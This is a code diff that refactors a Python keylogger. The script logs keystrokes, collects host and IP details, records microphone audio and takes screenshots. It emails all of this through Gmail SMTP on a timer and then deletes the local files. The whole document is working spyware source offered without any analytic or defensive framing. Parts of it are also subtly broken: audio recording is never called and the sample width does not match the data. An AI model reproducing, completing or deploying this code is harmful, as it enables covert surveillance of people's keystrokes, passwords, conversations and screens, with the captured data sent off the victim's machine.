@@ -1,29 +1,28 @@
 import logging
 import os
-import platform
 import smtplib
-import socket
 import threading
 import wave
 import sounddevice as sd
-from pynput import keyboard
-from pynput.keyboard import Listener
-from email import encoders
+from pynput import keyboard, mouse
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+from email import encoders
 import pyscreenshot
-import email
 import time
+import platform
+import socket
 
-# Configuration (use environment variables for security)
+# Configuration
 try:
     EMAIL_ADDRESS = os.environ["EMAIL_ADDRESS"]
     EMAIL_PASSWORD = os.environ["EMAIL_PASSWORD"]
 except KeyError as e:
-    print(f"Error: Missing environment variable {e}.  Please set EMAIL_ADDRESS and EMAIL_PASSWORD.")
+    print(f"Error: Missing environment variable {e}. Please set EMAIL_ADDRESS and EMAIL_PASSWORD.")
     exit(1)
-SEND_REPORT_EVERY = 60  # in seconds
+
+SEND_REPORT_EVERY = 60  # seconds
 
 
 class KeyLogger:
@@ -33,13 +32,22 @@ class KeyLogger:
         self.email = email
         self.password = password
         self.log_file = "keylog.txt"
-        self.log_format = "%(asctime)s - %(message)s"
-        logging.basicConfig(filename=self.log_file, level=logging.INFO, format=self.log_format)
-        logging.info("Keylogger started")
+        self.audio_file = "audio.wav"
+        self.screenshot_file = "screenshot.png"
+        logging.basicConfig(filename=self.log_file, level=logging.INFO, format="%(asctime)s - %(message)s")
+        self.system_information()
 
     def append_log(self, message):
-        self.log += str(message) + "\n"
-        logging.info(message)  # Log to file and console
+        self.log += f"{message}\n"
+        logging.info(message)
+
+    def system_information(self):
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        os_details = f"{platform.system()} {platform.version()} {platform.machine()}"
+        self.append_log(f"Hostname: {hostname}")
+        self.append_log(f"IP Address: {ip_address}")
+        self.append_log(f"OS Details: {os_details}")
 
     def on_press(self, key):
         try:
@@ -49,91 +57,85 @@ class KeyLogger:
 
     def on_release(self, key):
         if key == keyboard.Key.esc:
-            # Stop listener
             return False
-
-    def on_mouse_move(self, x, y):
-        self.append_log(f"Mouse moved to: ({x}, {y})")
-
-    def on_mouse_click(self, x, y, button, pressed):
-        self.append_log(f"Mouse click at ({x}, {y}), button: {button}, pressed: {pressed}")
-
-    def on_mouse_scroll(self, x, y, dx, dy):
-        self.append_log(f"Mouse wheel scrolled at ({x}, {y}), dx: {dx}, dy: {dy}")
-
-    def send_email(self):
-        msg = MIMEMultipart()
-        msg["Subject"] = "Keylogger Report"
-        msg["From"] = f"Keylogger <{EMAIL_ADDRESS}>"
-        msg["To"] = f"Recipient <recipient@example.com>"  # Replace with actual recipient
-
-        msg.attach(MIMEText(self.log))
-
-        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:  # Example for Gmail
-            server.login(self.email, self.password)
-            server.send_message(msg)
-
-        self.log = ""  # Clear log after sending
-        logging.info("Email sent successfully.")
 
     def record_audio(self):
         try:
             fs = 44100
-            seconds = SEND_REPORT_EVERY
-            filename = "audio.wav"
-            sd.rec(int(seconds * fs), samplerate=fs, channels=2, blocking=True, dtype="float32")
+            duration = self.interval
+            audio_data = sd.rec(int(fs * duration), samplerate=fs, channels=2, dtype="float32")
             sd.wait()
 
-            with wave.open(filename, 'wb') as wf:
-                wf.setnchannels(2)  # Assuming stereo
-                wf.setsampwidth(4)  # 4 bytes for float32
+            with wave.open(self.audio_file, 'wb') as wf:
+                wf.setnchannels(2)
+                wf.setsampwidth(2)
                 wf.setframerate(fs)
-                wf.writeframes(sd.rec(int(seconds * fs), samplerate=fs, channels=2, blocking=True, dtype="float32"))
+                wf.writeframes(audio_data.tobytes())
 
-            # Attach audio file to email
-            with open(filename, "rb") as attachment:
-                part = MIMEBase("application", "octet-stream")
-                part.set_payload(attachment.read())
-            encoders.encode_base64(part)
-            part.add_header("Content-Disposition", f"attachment; filename= {filename}")
-            msg.attach(part)
-
-
+            self.append_log("Audio recorded successfully.")
         except Exception as e:
             logging.error(f"Error recording audio: {e}")
 
     def take_screenshot(self):
         try:
-            filename = "screenshot.png"
-            pyscreenshot.grab().save(filename)
-            # Attach screenshot file to email
-            with open(filename, "rb") as attachment:
-                part = MIMEBase("image", "png")
-                part.set_payload(attachment.read())
-            encoders.encode_base64(part)
-            part.add_header("Content-Disposition", f"attachment; filename= {filename}")
-            msg.attach(part)
+            pyscreenshot.grab().save(self.screenshot_file)
+            self.append_log("Screenshot taken successfully.")
         except Exception as e:
             logging.error(f"Error taking screenshot: {e}")
 
+    def send_email(self):
+        try:
+            msg = MIMEMultipart()
+            msg["From"] = self.email
+            msg["To"] = self.email  # Update with actual recipient
+            msg["Subject"] = "Keylogger Report"
+
+            # Attach log file
+            msg.attach(MIMEText(self.log, "plain"))
+
+            # Attach audio file
+            if os.path.exists(self.audio_file):
+                with open(self.audio_file, "rb") as f:
+                    audio_part = MIMEBase("application", "octet-stream")
+                    audio_part.set_payload(f.read())
+                encoders.encode_base64(audio_part)
+                audio_part.add_header("Content-Disposition", f"attachment; filename={self.audio_file}")
+                msg.attach(audio_part)
+
+            # Attach screenshot
+            if os.path.exists(self.screenshot_file):
+                with open(self.screenshot_file, "rb") as f:
+                    screenshot_part = MIMEBase("image", "png")
+                    screenshot_part.set_payload(f.read())
+                encoders.encode_base64(screenshot_part)
+                screenshot_part.add_header("Content-Disposition", f"attachment; filename={self.screenshot_file}")
+                msg.attach(screenshot_part)
+
+            # Send email
+            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
+                server.login(self.email, self.password)
+                server.send_message(msg)
+
+            self.append_log("Email sent successfully.")
+        except Exception as e:
+            logging.error(f"Error sending email: {e}")
+        finally:
+            # Cleanup
+            if os.path.exists(self.audio_file):
+                os.remove(self.audio_file)
+            if os.path.exists(self.screenshot_file):
+                os.remove(self.screenshot_file)
+
     def run(self):
-        with Listener(on_press=self.on_press, on_release=self.on_release,
-                      on_move=self.on_mouse_move, on_click=self.on_mouse_click,
-                      on_scroll=self.on_mouse_scroll) as listener:
-            try:
-                self.append_log("Keylogger listener started")
-                timer = threading.Timer(self.interval, self.send_email)
-                timer.start()
-                listener.join()
-
-                # Add audio and screenshot recording
-                self.record_audio()
-                self.take_screenshot()
-
-                self.append_log("Keylogger stopped")
-            except Exception as e:
-                logging.exception(f"An error occurred in the listener: {e}")
+        self.append_log("Keylogger started.")
+        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as key_listener, \
+                mouse.Listener() as mouse_listener:
+            timer = threading.Timer(self.interval, self.send_email)
+            timer.start()
+            key_listener.join()
+            mouse_listener.join()
 
 
+# Start Keylogger
 keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
 keylogger.run()
